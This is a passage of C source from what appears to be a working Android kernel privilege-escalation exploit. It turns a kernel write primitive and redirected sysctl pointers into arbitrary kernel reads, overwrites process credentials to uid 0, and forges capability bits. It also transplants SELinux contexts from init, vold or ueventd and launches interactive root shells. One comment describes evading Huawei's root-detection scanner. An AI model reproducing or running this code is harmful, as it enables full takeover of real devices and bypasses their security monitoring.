      pr_error("read8: failed to restore boot_id ctl_table.data\n");
      return 0;
    }

    uint64_t side_effect = 0;
    if (read_ok) {
      memcpy(&side_effect, raw + 8, sizeof(side_effect));
    }
    if (read_ok && side_effect == bootid_data_field) {
      memcpy(out, raw, sizeof(raw));
      return 1;
    }
    if (attempt < 3) {
      pr_warning("read8: redirect not observed (attempt %d/3)\n", attempt);
    }
  }
  return 0;
}

static int slide_read8(uint64_t addr, uint64_t *out) {
  unsigned char raw[16];
  if (!slide_read_bytes16(addr, raw)) {
    return 0;
  }
  memcpy(out, raw, sizeof(*out));
  return 1;
}

static int slide_read8_no_restore(uint64_t addr, uint64_t *out) {
  const uint64_t bootid_data_field = canon_addr(SLIDE_BOOTID_CTL_DF_IMAGE);
  struct write_test redirect = {
    .name = "read8-no-restore",
    .shape = SHAPE_POINTER,
    .value = addr,
    .target = bootid_data_field,
  };
  if (!run_spec(&redirect)) {
    return 0;
  }

  unsigned char raw[16];
  uint64_t side_effect = 0;
  if (!slide_read_bootid(raw)) {
    return 0;
  }
  memcpy(&side_effect, raw + 8, sizeof(side_effect));
  if (side_effect != bootid_data_field) {
    return 0;
  }
  memcpy(out, raw, sizeof(*out));
  return 1;
}

static int slide_restore_boot_id_data(void) {
  struct write_test r = {
    .name = "restore-bootid-data",
    .shape = SHAPE_POINTER,
    .value = canon_addr(SLIDE_RANDOM_BOOT_ID_DATA_IMAGE),
    .target = canon_addr(SLIDE_BOOTID_CTL_DF_IMAGE),
  };
  return run_spec(&r);
}

int slide_run_restore_bootid(void) {
  int ok = slide_restore_boot_id_data();
  if (ok) {
    pr_success("restore-bootid PASSED\n");
  } else {
    pr_warning("restore-bootid FAILED\n");
  }
  return ok;
}

static uint64_t slide_capability_pattern(void) {
  /* Linux capability checks use only the low bits of the stored pointer.
   * Pick a mapped writable object whose runtime address has every capability
   * needed by the broker.  init_task and dump_skip()'s zero page are in
   * different 2 MiB halves, so one of them always has CAP_SYS_ADMIN's bit
   * set for the current KASLR slide. */
  const uint64_t required_bits =
      (1ULL << 1) |  /* CAP_DAC_OVERRIDE */
      (1ULL << 2) |  /* CAP_DAC_READ_SEARCH */
      (1ULL << 3) |  /* CAP_FOWNER */
      (1ULL << 4) |  /* CAP_FSETID */
      (1ULL << 5) |  /* CAP_KILL */
      (1ULL << 6) |  /* CAP_SETGID */
      (1ULL << 7) |  /* CAP_SETUID */
      (1ULL << 8) |  /* CAP_SETPCAP */
      (1ULL << 16) | /* CAP_SYS_MODULE */
      (1ULL << 21);  /* CAP_SYS_ADMIN */
  const uint64_t bases[] = {
      canon_addr(SLIDE_INIT_TASK_IMAGE),
      canon_addr(SLIDE_DUMP_SKIP_ZERO_PAGE_IMAGE),
  };

  for (size_t base_index = 0;
       base_index < sizeof(bases) / sizeof(bases[0]); base_index++) {
    /*
     * The first address carrying CAP_SYS_MODULE can cross the next 64 KiB
     * boundary.  init_task remains in the writable data image across this
     * range, so the pointer-write side effect stays on mapped memory.
     */
    for (uint64_t offset = 0; offset < 0x10000; offset++) {
      uint64_t candidate = bases[base_index] + offset;
      if ((candidate & required_bits) == required_bits) {
        pr_info("simple-root: capability pattern=%016llx base=%016llx "
                "offset=%#llx\n",
                (unsigned long long)candidate,
                (unsigned long long)bases[base_index],
                (unsigned long long)offset);
        return candidate;
      }
    }
  }
  return 0;
}

static int slide_set_live_capabilities(uint64_t cred) {
  const uint64_t capability_pattern = slide_capability_pattern();
  if (!capability_pattern) {
    pr_warning("simple-root: no capability pattern for slide=%016llx\n",
               (unsigned long long)kaslr_slide);
    return 0;
  }
  const struct {
    const char *name;
    uint64_t offset;
  } fields[] = {
    {"simple-root-cap-permitted", SLIDE_CRED_CAP_PERMITTED_OFF},
    {"simple-root-cap-effective", SLIDE_CRED_CAP_EFFECTIVE_OFF},
    {"simple-root-cap-bounding", SLIDE_CRED_CAP_BSET_OFF},
  };

  for (size_t i = 0; i < sizeof(fields) / sizeof(fields[0]); i++) {
    if (g_opts.no_cap_bounding && fields[i].offset ==
                                      SLIDE_CRED_CAP_BSET_OFF) {
      continue;
    }
    struct write_test capability = {
      .name = fields[i].name,
      .shape = SHAPE_POINTER,
      .value = capability_pattern,
      .target = cred + fields[i].offset,
    };
    if (!run_spec(&capability)) {
      pr_warning("simple-root: %s write failed\n", fields[i].name);
      return 0;
    }
  }
  return 1;
}

static int slide_read_init_security(uint64_t *out);
static int slide_read_init_security_fast(uint64_t *out);

static int slide_set_init_kernel_sid(uint64_t cred) {
  uint64_t init_security = 0;
  if (!slide_read_init_security_fast(&init_security)) {
    pr_warning("simple-root: safe init_cred.security read failed\n");
    return 0;
  }
  if (init_security < 0xffffff8000000000ULL || (init_security & 7)) {
    pr_warning("simple-root: invalid init_cred.security=%016llx\n",
               (unsigned long long)init_security);
    return 0;
  }

  struct write_test install = {
    .name = "simple-root-kernel-sid",
    .shape = SHAPE_POINTER,
    .value = init_security,
    .target = cred + SLIDE_CRED_SECURITY_OFF,
  };
  arm_kernel_shell_waiter();
  if (g_opts.no_cap_bounding) {
    g_opts.fire_and_forget = 1;
    int installed = run_spec(&install);
    g_opts.fire_and_forget = 0;
    return installed;
  }
  if (!run_spec(&install)) {
    return 0;
  }

  struct write_test repair_security = {
    .name = "simple-root-security-repair",
    .shape = SHAPE_LEAF,
    .target = init_security + 8,
  };
  if (!run_spec(&repair_security)) {
    return 0;
  }

  return 1;
}

static int slide_set_fake_kernel_sid(uint64_t cred) {
  slide_fake_security_addr = 0;

  struct write_test install = {
    .name = "simple-root-fake-kernel-sid",
    .shape = SHAPE_POINTER,
    .value = 0,
    .target = cred + SLIDE_CRED_SECURITY_OFF,
    .dynamic_fake_security = 1,
  };
  if (g_opts.no_cap_bounding) {
    g_opts.fire_and_forget = 1;
    int installed = run_spec(&install);
    g_opts.fire_and_forget = 0;
    return installed;
  }
  int ok = run_spec(&install);
  if (!ok || !slide_fake_security_addr) {
    pr_warning("simple-root: fake kernel SID carrier failed\n");
    return 0;
  }

  struct write_test repair = {
    .name = "simple-root-fake-security-repair",
    .shape = SHAPE_LEAF,
    .target = slide_fake_security_addr + 8,
  };
  return run_spec(&repair);
}

static int slide_redirect_poolsize_data(uint64_t address) {
  struct write_test redirect = {
    .name = "kernel-sid-poolsize-read",
    .shape = SHAPE_POINTER,
    .value = address,
    .target = canon_addr(SLIDE_RANDOM_POOLSIZE_DATA_IMAGE),
  };
  return run_spec(&redirect);
}

static int slide_restore_poolsize_data(void) {
  struct write_test restore = {
    .name = "kernel-sid-poolsize-restore",
    .shape = SHAPE_POINTER,
    .value = canon_addr(SLIDE_SYSCTL_POOLSIZE_IMAGE),
    .target = canon_addr(SLIDE_RANDOM_POOLSIZE_DATA_IMAGE),
  };
  if (!run_spec(&restore)) {
    return 0;
  }
  struct write_test clear_side_effect = {
    .name = "kernel-sid-poolsize-restore-tail",
    .shape = SHAPE_LEAF,
    .target = canon_addr(SLIDE_SYSCTL_POOLSIZE_IMAGE) + 8,
  };
  return run_spec(&clear_side_effect);
}

static int slide_read_u32_via_poolsize(uint64_t address, uint32_t *out) {
  if (!slide_redirect_poolsize_data(address)) {
    return 0;
  }

  int fd = open("/proc/sys/kernel/random/poolsize", O_RDONLY | O_CLOEXEC);
  if (fd < 0) {
    pr_warning("kernel-sid: poolsize open failed errno=%d\n", errno);
    return 0;
  }
  char text[64];
  ssize_t n = read(fd, text, sizeof(text) - 1);
  int saved_errno = errno;
  close(fd);
  if (n <= 0) {
    pr_warning("kernel-sid: poolsize read failed errno=%d\n", saved_errno);
    return 0;
  }
  text[n] = 0;
  char *end = NULL;
  errno = 0;
  long value = strtol(text, &end, 10);
  if (errno || end == text || value < INT32_MIN || value > INT32_MAX) {
    pr_warning("kernel-sid: poolsize parse failed text=%.32s\n", text);
    return 0;
  }
  *out = (uint32_t)(int32_t)value;
  return 1;
}

static int slide_restore_init_cred_links(void) {
  const uint64_t init_cred = canon_addr(SLIDE_INIT_CRED_IMAGE);
  const uint64_t root_user = canon_addr(SLIDE_ROOT_USER_IMAGE);
  const uint64_t init_user_ns = canon_addr(SLIDE_INIT_USER_NS_IMAGE);
  const uint64_t init_groups = canon_addr(SLIDE_INIT_GROUPS_IMAGE);
  struct write_test user = {
    .name = "kernel-sid-restore-user",
    .shape = SHAPE_POINTER,
    .value = root_user,
    .target = init_cred + SLIDE_CRED_USER_OFF,
  };
  struct write_test user_ns = {
    .name = "kernel-sid-restore-user-ns",
    .shape = SHAPE_POINTER,
    .value = init_user_ns,
    .target = init_cred + SLIDE_CRED_USER_NS_OFF,
  };
  struct write_test groups = {
    .name = "kernel-sid-restore-groups",
    .shape = SHAPE_POINTER,
    .value = init_groups,
    .target = init_cred + SLIDE_CRED_GROUP_INFO_OFF,
  };
  struct write_test tail = {
    .name = "kernel-sid-restore-tail",
    .shape = SHAPE_LEAF,
    .target = init_cred + 0x98,
  };
  struct write_test root_user_tail = {
    .name = "kernel-sid-root-user-tail",
    .shape = SHAPE_LEAF,
    .target = root_user + 8,
  };
  struct write_test user_ns_tail = {
    .name = "kernel-sid-user-ns-tail",
    .shape = SHAPE_LEAF,
    .target = init_user_ns + 8,
  };

  int ok = 1;
  ok &= run_spec(&user);
  ok &= run_spec(&user_ns);
  ok &= run_spec(&groups);
  ok &= run_spec(&tail);
  ok &= run_spec(&root_user_tail);
  ok &= run_spec(&user_ns_tail);
  return ok;
}

static int slide_read_init_security(uint64_t *out) {
  const uint64_t init_cred = canon_addr(SLIDE_INIT_CRED_IMAGE);
  uint32_t low = 0;
  uint32_t high = 0;
  int ok = slide_read_u32_via_poolsize(
               init_cred + SLIDE_CRED_SECURITY_OFF, &low) &&
           slide_read_u32_via_poolsize(
               init_cred + SLIDE_CRED_SECURITY_OFF + 4, &high);
  int restored = slide_restore_poolsize_data();
  int cred_restored = slide_restore_init_cred_links();
  if (!ok || !restored || !cred_restored) {
    pr_warning("kernel-sid: safe init_cred.security read failed "
               "(read=%d poolsize=%d links=%d)\n",
               ok, restored, cred_restored);
    return 0;
  }
  *out = ((uint64_t)high << 32) | low;
  pr_success("kernel-sid: init_cred.security=%016llx\n",
             (unsigned long long)*out);
  return 1;
}

static int slide_read_init_security_fast(uint64_t *out) {
  const uint64_t init_cred = canon_addr(SLIDE_INIT_CRED_IMAGE);
  uint64_t security_pointer = 0;
  int have_pointer = 0;
  for (int attempt = 1; attempt <= 3; attempt++) {
    int read_ok =
        slide_read8(init_cred + SLIDE_CRED_SECURITY_OFF, &security_pointer);
    if (read_ok && security_pointer >= 0xffffff8000000000ULL &&
        security_pointer < 0xffffffc000000000ULL &&
        !(security_pointer & 7)) {
      have_pointer = 1;
      break;
    }
    pr_warning("kernel-sid: security read attempt %d invalid "
               "(read=%d value=%016llx)\n",
               attempt, read_ok, (unsigned long long)security_pointer);
  }
  if (!have_pointer) {
    pr_warning("kernel-sid: no plausible init_cred.security pointer\n");
    return 0;
  }

  const uint64_t root_user = canon_addr(SLIDE_ROOT_USER_IMAGE);
  struct write_test restore_user = {
    .name = "kernel-sid-restore-init-user",
    .shape = SHAPE_POINTER,
    .value = root_user,
    .target = init_cred + SLIDE_CRED_USER_OFF,
  };
  struct write_test clear_user_side_effect = {
    .name = "kernel-sid-clear-init-user-side-effect",
    .shape = SHAPE_LEAF,
    .target = root_user + 8,
  };
  if (!run_spec(&restore_user) || !run_spec(&clear_user_side_effect)) {
    pr_warning("kernel-sid: init_cred.user repair failed\n");
    return 0;
  }

  *out = security_pointer;
  pr_success("kernel-sid: fast init_cred.security=%016llx\n",
             (unsigned long long)security_pointer);
  return 1;
}

static int slide_apply_kernel_domain(uint64_t cred) {
  if (!slide_set_live_capabilities(cred)) {
    return 0;
  }
  return slide_set_init_kernel_sid(cred);
}

int slide_grant_live_capabilities(void) {
  if (!slide_root_cred) {
    pr_warning("live capabilities: no root cred captured\n");
    return 0;
  }
  return slide_set_live_capabilities(slide_root_cred);
}

int slide_run_kernel_domain(void) {
  if (slide_kernel_domain_applied) {
    return 1;
  }
  if (!slide_root_cred) {
    pr_warning("kernel-domain: no root cred captured\n");
    return 0;
  }
  if (!slide_apply_kernel_domain(slide_root_cred)) {
    return 0;
  }
  slide_kernel_domain_applied = 1;
  return 1;
}

int slide_run_kernel_sid_only(void) {
  if (!slide_root_cred) {
    pr_warning("kernel-sid-only: no root cred captured\n");
    return 0;
  }
  return slide_set_fake_kernel_sid(slide_root_cred);
}

static void slide_probe_exec_shell(void) {
  pid_t child = fork();
  if (child == 0) {
    execl("/system/bin/sh", "sh", "-c", "id", (char *)NULL);
    _exit(127);
  }
  if (child < 0) {
    pr_warning("kernel-domain probe: shell fork errno=%d\n", errno);
    return;
  }
  int status = 0;
  if (waitpid(child, &status, 0) != child) {
    pr_warning("kernel-domain probe: shell wait errno=%d\n", errno);
    return;
  }
  if (WIFEXITED(status)) {
    pr_info("kernel-domain probe: shell exit=%d\n", WEXITSTATUS(status));
  } else if (WIFSIGNALED(status)) {
    pr_warning("kernel-domain probe: shell signal=%d\n", WTERMSIG(status));
  }
}

static void slide_probe_kernel_domain(void) {
  char ctx[128] = "?";
  read_first_line("/proc/self/attr/current", ctx, sizeof(ctx));

  const char *test_path = "/data/local/tmp/gl-kdomain-test";
  errno = 0;
  int file_fd =
      open(test_path, O_WRONLY | O_CREAT | O_TRUNC | O_CLOEXEC, 0600);
  int file_errno = errno;
  if (file_fd >= 0) {
    (void)!write(file_fd, "kernel-domain\n", 14);
    close(file_fd);
    (void)unlink(test_path);
  }

  errno = 0;
  int sysctl_fd = open("/proc/sys/kernel/random/urandom_min_reseed_secs",
                       O_WRONLY | O_CLOEXEC);
  int sysctl_errno = errno;
  if (sysctl_fd >= 0) {
    close(sysctl_fd);
  }

  const char *mount_dir = "/data/local/tmp/gl-kdomain-mnt";
  (void)mkdir(mount_dir, 0700);
  errno = 0;
  int mount_rc = mount("tmpfs", mount_dir, "tmpfs",
                       MS_NOSUID | MS_NODEV, "mode=0700");
  int mount_errno = errno;
  if (mount_rc == 0) {
    (void)umount2(mount_dir, 0);
  }
  (void)rmdir(mount_dir);

  pr_success("kernel-domain probe: uid=%d euid=%d ctx=%s file=%d/%d "
             "sysctl=%d/%d mount=%d/%d\n",
             (int)getuid(), (int)geteuid(), ctx, file_fd >= 0, file_errno,
             sysctl_fd >= 0, sysctl_errno, mount_rc == 0, mount_errno);
  slide_probe_exec_shell();
}

/* Route A (--simple): preserve the shell task_security_struct and edit the
 * live cred directly. Avoid setresuid(0), which increments Huawei's
 * checkroot_ref state and is visible to the periodic root scanner. */
static int slide_comm_matches(uint64_t kernel_comm, const char *comm) {
  size_t length = strlen(comm);
  if (length > sizeof(kernel_comm)) {
    length = sizeof(kernel_comm);
  }
  return !memcmp(&kernel_comm, comm, length);
}

static pid_t slide_start_target_repair_helper(uint64_t target_security) {
  pid_t helper = fork();
  if (helper != 0) {
    return helper;
  }

  (void)prctl(PR_SET_NAME, "gltsecfix", 0, 0, 0);
  /* Forked creds are shared.  Securebits uses prepare_creds(), giving this
   * helper its own shell-domain security blob before the target is installed. */
  if (prctl(PR_SET_SECUREBITS, 0, 0, 0, 0) != 0) {
    pr_warning("target-security helper securebits errno=%d\n", errno);
  }

  sigset_t wake_set;
  sigemptyset(&wake_set);
  sigaddset(&wake_set, SIGUSR1);
  (void)pthread_sigmask(SIG_BLOCK, &wake_set, NULL);
  int signal_number = 0;
  if (sigwait(&wake_set, &signal_number) != 0) {
    _exit(2);
  }

  struct write_test repair_target = {
    .name = "target-domain-security-post-repair",
    .shape = SHAPE_LEAF,
    .target = target_security + 8,
  };
  int ok = run_spec(&repair_target);
  _exit(ok ? 0 : 1);
}

static void slide_vold_trace(const char *message) {
  int fd = open("/sdcard/gl-vold-trace.log",
                O_WRONLY | O_CREAT | O_APPEND | O_CLOEXEC, 0666);
  if (fd < 0) {
    return;
  }
  (void)!dprintf(fd, "pid=%d %s\n", (int)getpid(), message);
  (void)fsync(fd);
  close(fd);
}

static int slide_exec_target_shell(void) {
  slide_vold_trace("target-shell-begin");
  const char *shell_path =
      (g_opts.shell_path && g_opts.shell_path[0])
          ? g_opts.shell_path
          : "/system/bin/toybox";
  pid_t shell_process = fork();
  if (shell_process == 0) {
    slide_vold_trace("target-shell-child");
    signal(SIGHUP, SIG_DFL);
    signal(SIGINT, SIG_DFL);
    signal(SIGTERM, SIG_DFL);
    signal(SIGQUIT, SIG_DFL);
    sigset_t empty_set;
    sigemptyset(&empty_set);
    (void)pthread_sigmask(SIG_SETMASK, &empty_set, NULL);
    execl(shell_path, "sh", "-i", (char *)NULL);
    slide_vold_trace("target-shell-exec-failed");
    dprintf(2, "target-shell: exec %s errno=%d\n", shell_path, errno);
    _exit(127);
  }
  if (shell_process < 0) {
    slide_vold_trace("target-shell-fork-failed");
    pr_warning("target-shell: fork errno=%d\n", errno);
    for (;;) {
      pause();
    }
  }

  /* This process owns the vold credential and must stay alive until a reboot;
   * otherwise the shared SELinux blob could be freed while vold still uses it. */
  signal(SIGHUP, SIG_IGN);
  signal(SIGINT, SIG_IGN);
  signal(SIGTERM, SIG_IGN);
  signal(SIGQUIT, SIG_IGN);
  slide_vold_trace("target-shell-parent-holding");
  pr_success("target-shell: pid=%d shell=%s cred-held-forever\n",
             (int)shell_process, shell_path);
  for (;;) {
    pause();
  }
  return 1;
}

static int slide_find_task_by_comm(const char *target_comm,
                                   uint64_t *task_out);

static int slide_apply_target_domain(pid_t target_pid,
                                     const char *target_comm) {
  if (!slide_root_cred) {
    pr_warning("target-domain: missing live cred\n");
    return 0;
  }
  if (g_opts.target_task_addr) {
    perf_task_cand[0] = g_opts.target_task_addr;
    perf_task_cnt[0] = 1;
    perf_task_ncand = 1;
  } else {
    (void)perf_leak_task_pid(target_pid);
    if (!perf_task_ncand) {
      uint64_t task_by_comm = 0;
      if (slide_find_task_by_comm(target_comm, &task_by_comm)) {
        perf_task_cand[0] = task_by_comm;
        perf_task_cnt[0] = 1;
        perf_task_ncand = 1;
      }
    }
  }
  if (!perf_task_ncand) {
    pr_warning("target-domain: no task candidates leaked for pid=%d\n",
               (int)target_pid);
    return 0;
  }

  for (int index = 0; index < perf_task_ncand; index++) {
    uint64_t task = perf_task_cand[index];
    uint64_t comm = 0;
    int comm_matched = 0;
    for (int attempt = 0; attempt < 2; attempt++) {
      if (slide_read8(task + SLIDE_TASK_COMM_OFF, &comm) &&
          slide_comm_matches(comm, target_comm)) {
        comm_matched = 1;
        break;
      }
    }
    if (!comm_matched) {
      continue;
    }

    uint64_t target_cred = 0;
    int cred_valid = 0;
    for (int attempt = 0; attempt < 3; attempt++) {
      if (slide_read8(task + SLIDE_TASK_CRED_OFF, &target_cred) &&
          target_cred >= 0xffffff8000000000ULL && !(target_cred & 7)) {
        cred_valid = 1;
        break;
      }
    }
    struct write_test clear_cached_key = {
      .name = "target-domain-clear-cached-key",
      .shape = SHAPE_LEAF,
      .target = task + SLIDE_TASK_CRED_OFF + 8,
    };
    (void)run_spec(&clear_cached_key);
    if (!cred_valid) {
      continue;
    }

    uint64_t target_security = 0;
    int security_valid = 0;
    for (int attempt = 0; attempt < 3; attempt++) {
      if (slide_read8(target_cred + SLIDE_CRED_SECURITY_OFF,
                      &target_security) &&
          target_security >= 0xffffff8000000000ULL &&
          target_security < 0xffffffc000000000ULL &&
          !(target_security & 7)) {
        security_valid = 1;
        break;
      }
    }

    const uint64_t root_user = canon_addr(SLIDE_ROOT_USER_IMAGE);
    struct write_test restore_target_user = {
      .name = "target-domain-restore-user",
      .shape = SHAPE_POINTER,
      .value = root_user,
      .target = target_cred + SLIDE_CRED_USER_OFF,
    };
    struct write_test clear_target_user_tail = {
      .name = "target-domain-clear-user-tail",
      .shape = SHAPE_LEAF,
      .target = root_user + 8,
    };
    if (!run_spec(&restore_target_user) ||
        !run_spec(&clear_target_user_tail)) {
      pr_warning("target-domain: target cred user repair failed\n");
      return 0;
    }
    if (!security_valid) {
      continue;
    }

    struct write_test repair_before_install = {
      .name = "target-domain-security-pre-repair",
      .shape = SHAPE_LEAF,
      .target = target_security + 8,
    };
    if (!run_spec(&repair_before_install)) {
      return 0;
    }
    pid_t repair_helper = slide_start_target_repair_helper(target_security);
    if (repair_helper < 0) {
      pr_warning("target-domain: repair helper fork failed errno=%d\n", errno);
      return 0;
    }

    struct write_test install = {
      .name = "target-domain-security",
      .shape = SHAPE_POINTER,
      .value = target_security,
      .target = slide_root_cred + SLIDE_CRED_SECURITY_OFF,
    };
    int install_ok = run_spec(&install);
    if (!install_ok) {
      pr_warning("target-domain: install check failed; continuing to verify "
                 "the resulting context\n");
    }
    slide_vold_trace("target-domain-installed");

    (void)kill(repair_helper, SIGUSR1);
    int helper_status = 0;
    (void)waitpid(repair_helper, &helper_status, 0);
    if (!WIFEXITED(helper_status) || WEXITSTATUS(helper_status) != 0) {
      pr_warning("target-domain: post-install security repair failed "
                 "status=%#x\n", helper_status);
    }
    slide_vold_trace("target-domain-repair-waited");
    return 1;
  }

  pr_warning("target-domain: process comm=%s not found\n", target_comm);
  return 0;
}

static int slide_read_u64_poolsize(uint64_t address, uint64_t *out) {
  uint32_t low = 0;
  uint32_t high = 0;
  int read_ok = slide_read_u32_via_poolsize(address, &low) &&
                slide_read_u32_via_poolsize(address + 4, &high);
  int restored = slide_restore_poolsize_data();
  if (!read_ok || !restored) {
    return 0;
  }
  *out = ((uint64_t)high << 32) | low;
  return 1;
}

static int slide_find_task_by_comm(const char *target_comm,
                                   uint64_t *task_out) {
  const uint64_t init_task = canon_addr(SLIDE_INIT_TASK_IMAGE);
  const uint64_t init_tasks = init_task + 0x500;
  uint64_t node = 0;
  if (!slide_read_u64_poolsize(init_tasks, &node)) {
    pr_warning("target-task: failed to read init_task.tasks.next\n");
    return 0;
  }

  for (int visited = 0; visited < 4096; visited++) {
    uint64_t task = node - 0x500;
    if (task == init_task) {
      break;
    }

    uint64_t comm = 0;
    if (slide_read8(task + SLIDE_TASK_COMM_OFF, &comm) &&
        slide_comm_matches(comm, target_comm)) {
      pr_success("target-task: %s task=%016llx\n", target_comm,
                 (unsigned long long)task);
      *task_out = task;
      return 1;
    }

    uint64_t next_node = 0;
    if (!slide_read_u64_poolsize(node, &next_node)) {
      pr_warning("target-task: failed to read task list node=%016llx\n",
                 (unsigned long long)node);
      return 0;
    }
    node = next_node;
  }

  pr_warning("target-task: %s not found\n", target_comm);
  return 0;
}

int slide_run_target_uevent(void) {
  uint64_t ueventd_task = 0;
  if (!slide_find_task_by_comm("ueventd", &ueventd_task)) {
    return 0;
  }
  g_opts.target_task_addr = ueventd_task;
  return slide_apply_target_domain(507, "ueventd");
}

int slide_run_target_init_self(void) {
  return slide_apply_target_domain(1, "init");
}

int slide_set_current_target_domain(int target_pid, const char *target_comm) {
  return slide_apply_target_domain((pid_t)target_pid, target_comm);
}

int slide_run_target_only(int target_pid, const char *target_comm,
                          uint64_t target_task) {
  char self_comm[16] = {0};
  (void)prctl(PR_GET_NAME, self_comm, 0, 0, 0);
  (void)perf_leak_task();

  uint64_t current_cred = 0;
  for (int index = 0; index < perf_task_ncand; index++) {
    uint64_t task = perf_task_cand[index];
    uint64_t comm = 0;
    if (!slide_read8(task + SLIDE_TASK_COMM_OFF, &comm) ||
        !slide_comm_matches(comm, self_comm)) {
      continue;
    }
    if (slide_read8(task + SLIDE_TASK_CRED_OFF, &current_cred) &&
        current_cred >= 0xffffff8000000000ULL &&
        !(current_cred & 7)) {
      break;
    }
  }
  if (!current_cred) {
    pr_warning("target-only: failed to locate current cred\n");
    return 0;
  }

  slide_root_cred = current_cred;
  if (!slide_set_live_capabilities(current_cred)) {
    pr_warning("target-only: capability setup failed\n");
    return 0;
  }
  if (!slide_apply_target_domain(target_pid, target_comm)) {
    return 0;
  }
  if (g_opts.target_shell) {
    return slide_exec_target_shell();
  }
  for (;;) {
    pause();
  }
}

int slide_run_simple_root(void) {
  char self_comm[16] = {0};
  (void)prctl(PR_GET_NAME, self_comm, 0, 0, 0);

  /* A successful write must never be followed by the worker exiting. */
  g_opts.hold = 0;
  g_opts.detach = 1;
  start_kernel_shell_waiter();

  for (int round = 0; round < g_opts.task_rounds; round++) {
    (void)perf_leak_task();
    if (perf_task_ncand) {
      break;
    }
    pr_warning("simple-root: task leak round %d/%d missed\n", round + 1,
               g_opts.task_rounds);
  }
  if (!perf_task_ncand) {
    pr_warning("simple-root: no task candidates leaked\n");
    return 0;
  }
  pr_info("simple-root: probing %d task candidate(s), uid=%d\n",
          perf_task_ncand, (int)getuid());

  for (int i = 0; i < perf_task_ncand; i++) {
    uint64_t task = perf_task_cand[i];
    uint64_t comm = 0;
    int comm_matched = 0;
    for (int attempt = 0; attempt < 2; attempt++) {
      if (slide_read8(task + SLIDE_TASK_COMM_OFF, &comm) &&
          slide_comm_matches(comm, self_comm)) {
        comm_matched = 1;
        break;
      }
    }
    if (!comm_matched) {
      pr_info("simple-root: candidate %016llx comm=%016llx rejected\n",
              (unsigned long long)task, (unsigned long long)comm);
      continue;
    }
    (void)prctl(PR_SET_NAME, self_comm, 0, 0, 0);

    uint64_t cred = 0;
    int cred_valid = 0;
    for (int attempt = 0; attempt < 3; attempt++) {
      if (slide_read8(task + SLIDE_TASK_CRED_OFF, &cred) &&
          cred >= 0xffffff8000000000ULL && !(cred & 7)) {
        cred_valid = 1;
        break;
      }
      pr_warning("simple-root: cred read attempt %d invalid value=%016llx\n",
                 attempt + 1, (unsigned long long)cred);
    }
    (void)prctl(PR_SET_NAME, self_comm, 0, 0, 0);
    if (!cred_valid) {
      continue;
    }

    pr_info("simple-root: task=%016llx cred=%016llx\n",
            (unsigned long long)task, (unsigned long long)cred);

    int ids_ok = 1;
    for (int word = 0; word < 4; word++) {
      struct write_test ids = {
        .name = "simple-root-ids",
        .shape = SHAPE_LEAF,
        .target = cred + SLIDE_CRED_UID_OFF + (uint64_t)word * 8,
      };
      if (!run_spec(&ids)) {
        pr_warning("simple-root: id write word=%d failed\n", word);
        ids_ok = 0;
        break;
      }
    }
    if (!ids_ok) {
      continue;
    }

    /* The 4-byte-aligned uid block is fragile on this kernel.  Cover the
     * fsuid/fsgid/securebits tail again with aligned 8-byte leaf stores. */
    struct write_test ids_tail_20 = {
      .name = "simple-root-ids-tail-20",
      .shape = SHAPE_LEAF,
      .target = cred + 0x20,
    };
    if (!run_spec(&ids_tail_20)) {
      pr_warning("simple-root: aligned identity tail write failed\n");
      continue;
    }

    slide_root_cred = cred;
    if (g_opts.target_domain_pid > 0) {
      const char *target_comm =
          (g_opts.target_domain_comm && g_opts.target_domain_comm[0])
              ? g_opts.target_domain_comm
              : "vold";
      if (!slide_set_live_capabilities(cred)) {
        pr_warning("target-domain: capability setup failed\n");
        return 0;
      }
      if (!slide_apply_target_domain((pid_t)g_opts.target_domain_pid,
                                     target_comm)) {
        return 0;
      }
      if (g_opts.target_shell) {
        slide_vold_trace("target-shell-branch");
        return slide_exec_target_shell();
      }
      if (g_opts.kernel_shell) {
        execl("/system/bin/toybox", "toybox", "sh", "-i", (char *)NULL);
        _exit(127);
      }
      pr_info("target-domain: installed without a shell; holding cred\n");
      for (;;) {
        pause();
      }
    }
    if (g_opts.kernel_domain) {
      if (!slide_apply_kernel_domain(cred)) {
        pr_warning("simple-root: kernel-domain setup failed\n");
        return 0;
      }
      slide_kernel_domain_applied = 1;
    }
    if (g_opts.kernel_shell) {
      const char *sh = (g_opts.shell_path && g_opts.shell_path[0])
                           ? g_opts.shell_path
                           : "/system/bin/sh";
      execl(sh, "sh", "-i", (char *)NULL);
      _exit(127);
    }
    if (g_opts.kernel_domain_probe) {
      slide_probe_kernel_domain();
    }

    pr_info("simple-root: direct ids uid=%d euid=%d gid=%d egid=%d\n",
            (int)getuid(), (int)geteuid(), (int)getgid(), (int)getegid());
    if (getuid() == 0 && geteuid() == 0) {
      char ctx[128] = "?";
      read_first_line("/proc/self/attr/current", ctx, sizeof(ctx));
      pr_success("simple-root: LEGAL ROOT uid=0 euid=0 ctx=%s cred=%016llx\n",
                 ctx, (unsigned long long)cred);
      return 1;
    }
  }

  pr_warning("simple-root: failed\n");
  return 0;
}

int slide_run_current_sid_probe(void) {
  uint64_t task = 0;
  char self_comm[16] = {0};
  (void)prctl(PR_GET_NAME, self_comm, 0, 0, 0);
  for (int round = 0; round < g_opts.task_rounds; round++) {
    task = perf_leak_task();
    if (task) {
      break;
    }
  }
  if (!task) {
    pr_warning("sid-probe: failed to leak current task\n");
    return 0;
  }

  uint64_t task_comm = 0;
  if (!slide_read8(task + SLIDE_TASK_COMM_OFF, &task_comm) ||
      !slide_comm_matches(task_comm, self_comm)) {
    pr_warning("sid-probe: leaked task comm does not match %s\n", self_comm);
    return 0;
  }

  uint64_t cred = 0;
  if (!slide_read8_no_restore(task + SLIDE_TASK_CRED_OFF, &cred) ||
      cred < 0xffffff8000000000ULL || (cred & 7)) {
    pr_warning("sid-probe: failed to read current cred\n");
    return 0;
  }

  uint64_t security = 0;
  if (!slide_read8_no_restore(cred + SLIDE_CRED_SECURITY_OFF, &security) ||
      security < 0xffffff8000000000ULL || (security & 7)) {
    pr_warning("sid-probe: failed to read current security blob\n");
    return 0;
  }

  uint64_t ids = 0;
  if (!slide_read8_no_restore(security, &ids)) {
    pr_warning("sid-probe: failed to read task security SID\n");
    return 0;
  }
  (void)slide_restore_boot_id_data();

  uint32_t osid = (uint32_t)ids;
  uint32_t sid = (uint32_t)(ids >> 32);
  pr_success("sid-probe: security=%016llx osid=%u sid=%u\n",
             (unsigned long long)security, osid, sid);
  return 1;
}

int slide_run_escalate(void) {
  uint64_t init_cred = canon_addr(SLIDE_INIT_CRED_IMAGE);
  char self_comm[16] = {0};
  (void)prctl(PR_GET_NAME, self_comm, 0, 0, 0);
